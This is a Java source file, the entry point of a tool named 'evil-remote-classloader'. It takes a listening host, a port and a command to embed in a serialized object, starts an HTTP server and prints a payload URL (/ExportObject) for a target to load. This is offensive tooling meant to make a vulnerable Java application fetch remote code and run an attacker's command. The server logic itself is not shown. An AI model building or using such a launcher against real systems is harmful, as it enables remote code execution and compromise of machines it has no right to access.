package gds.erc;

import java.net.InetAddress;
import java.net.UnknownHostException;

import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.HelpFormatter;
import org.apache.commons.cli.Option;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;

public class Main {

	public static void main(String[] args) {

		Options options = new Options();

		InetAddress host;
		Option input1 = new Option("l", "host", true, "listening ip/host");
		input1.setRequired(true);
		options.addOption(input1);

		int httpPort;
		Option input2 = new Option("p", "http-port", true, "HTTP listening port");
		input2.setRequired(true);
		options.addOption(input2);

		String command;
		Option input3 = new Option("c", "command", true, "command in serialized object");
		input3.setRequired(true);
		options.addOption(input3);

		CommandLineParser parser = new DefaultParser();
		HelpFormatter formatter = new HelpFormatter();
		CommandLine cmd;

		try {
			cmd = parser.parse(options, args);

			host = InetAddress.getByName(cmd.getOptionValue("host"));
			httpPort = Integer.parseInt(cmd.getOptionValue("http-port"));
			command = cmd.getOptionValue("command");

			MyHttpServer.run(host, httpPort, command);

			System.out.println("[+] Remote classloader configured. Use the following payload:");
			System.out.println("http://" + host.getHostAddress() + ":" + httpPort + "/ExportObject\n");

		} catch (ParseException | UnknownHostException e) {
			System.out.println(e.getMessage());
			formatter.printHelp("evil-remote-classloader", options);
			System.exit(1);
		}

	}
}
